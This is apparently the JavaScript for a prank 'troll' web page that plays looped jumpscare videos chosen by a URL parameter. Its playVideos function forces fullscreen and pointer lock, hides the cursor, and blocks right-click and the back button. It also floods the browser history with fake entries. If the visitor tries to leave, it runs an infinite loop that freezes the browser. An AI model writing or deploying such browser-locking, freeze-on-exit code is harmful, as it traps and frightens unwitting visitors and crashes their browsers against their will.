const params = new URLSearchParams(window.location.search);

if (params.has("refsu")) {
  const configs = {
    'title': 'Refsu core',
    'button': 'Zagraj',
    'info': '2 ver. images/videos are available forever.',
    'videos': ['https://files.catbox.moe/wgni3l.mp4', 'https://files.catbox.moe/t414zy.mp4', 'https://files.catbox.moe/7qqxgr.mp4', 'https://files.catbox.moe/6wdagr.mp4', 'https://files.catbox.moe/n607dy.mp4', 'https://files.catbox.moe/djiz11.mp4'],
    'brwhen': false
  }
  setup(configs)
} else if (params.has("obs")) {
  const configs = {
    'title': 'OBS Jumpscares',
    'button': 'LOUDY SHAKI',
    'info': 'warning loud voices',
    'videos': ['https://files.catbox.moe/tuqbn4.mp4', 'https://files.catbox.moe/ilv94h.mp4', 'https://files.catbox.moe/etoh9l.mp4', 'https://files.catbox.moe/tnezjh.mp4'],
    'brwhen': '3'
  }
  setup(configs)
} else if (params.has("letmeout")) {
  const configs = {
    'title': 'Let me out of here now',
    'button': 'Let me out of here now!',
    'info': 'warning loud voices',
    'videos': ['https://files.catbox.moe/tnezjh.mp4', 'https://files.catbox.moe/8nyd52.mp4', 'https://files.catbox.moe/6jyw74.mp4'],
    'brwhen': false
  }
  setup(configs)
} else {
  window.location.href = 'https://linktr.ee/refproject#header-437047852'
}

function setup(configs) {
  // Title
  document.title = configs.title
  document.addEventListener("DOMContentLoaded", () => {
    // Buttons & info
    if (!params.has("safe")) {document.body.innerHTML = `<button onclick="playVideos()">` + configs.button + `</button>  <i class="fas fa-info-circle" onclick="alert('` + configs.info + `')"></i><br><br>`
    } else {document.body.innerHTML = `<button>` + configs.button + `</button>  <i class="fas fa-info-circle" onclick="alert('` + configs.info + `')"></i><br><br>`}
    // Videos
    configs.videos.forEach((src, index) => {
      const video = document.createElement('video');
      video.src = src;
      video.loop = true
      document.body.appendChild(video);
      if (!configs.brwhen == false) {
        if ((index + 1) % configs.brwhen === 0) {
          document.body.appendChild(document.createElement('br'));
        }
      }
    });
    // Last
    document.querySelector('button').addEventListener('click', () => {document.querySelectorAll('video').forEach(video => video.play());});
    document.querySelectorAll('video').forEach(video => {video.addEventListener('contextmenu', (event) => {event.preventDefault();});});
  });
}

// Troll functions
let freezeActive = false;
function playVideos() {
  // Ask Before Closing
  window.onbeforeunload = function() {return "Oh you little brat!"};
  // Remove Info Button
  document.querySelector('i').remove();
  // Hide Cursor
  document.body.style.cursor = "none";
  // Enter Fullscreen/Pointer Lock on Click
  document.body.addEventListener('click', () => { 
    (document.documentElement.requestFullscreen || document.documentElement.webkitRequestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.msRequestFullscreen)?.call(document.documentElement);
    (document.documentElement.requestPointerLock || document.documentElement.webkitRequestPointerLock || document.documentElement.mozRequestPointerLock || document.documentElement.msRequestPointerLock)?.call(document.documentElement);
  });
  // Block Right Click
  document.body.addEventListener('contextmenu', (event) => event.preventDefault());
  // Block Back Button/Freeze Browser on Go Back
  history.pushState(null, "", location.href);
  window.onpopstate = function() {history.pushState(null, "", location.href); freezeBrowser();};
  // Freeze Browser on Fullscreen Exit
  document.addEventListener("fullscreenchange", () => {if (!document.fullscreenElement) {freezeBrowser();}});
  // Enter Fullscreen
  if (document.documentElement.requestFullscreen) {document.documentElement.requestFullscreen();}
  else if (document.documentElement.webkitRequestFullscreen) {document.documentElement.webkitRequestFullscreen();}
  else if (document.documentElement.mozRequestFullScreen) {document.documentElement.mozRequestFullScreen();}
  else if (document.documentElement.msRequestFullscreen) {document.documentElement.msRequestFullscreen();}
  // Request/Enter Pointer Lock
  if (document.documentElement.requestPointerLock) {document.documentElement.requestPointerLock();}
  else if (document.documentElement.webkitRequestPointerLock) {document.documentElement.webkitRequestPointerLock();}
  else if (document.documentElement.mozRequestPointerLock) {document.documentElement.mozRequestPointerLock();}
  else if (document.documentElement.msRequestPointerLock) {document.documentElement.msRequestPointerLock();}
  // Fill History with Fake Entries
  for (let i = 0; i < 20; i++) {
    history.pushState(null, "", location.href + "?p=" + i);
  }
  if (params.has("refsu")) {
    history.replaceState(null, "", location.pathname + "?refsu");
  } else if (params.has("obs")) {
    history.replaceState(null, "", location.pathname + "?obs");
  } else if (params.has("letmeout")) {
    history.replaceState(null, "", location.pathname + "?letmeout");
  }
  // Freeze Browser function
  function freezeBrowser() {
    if (freezeActive) return;
    freezeActive = true;
    console.log("🔥 freeze 🔥");
    setInterval(() => {
      let arr = [];
      while (true) {
        arr.push("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥");
        console.log(arr)
      }
    }, 10);
  }
}
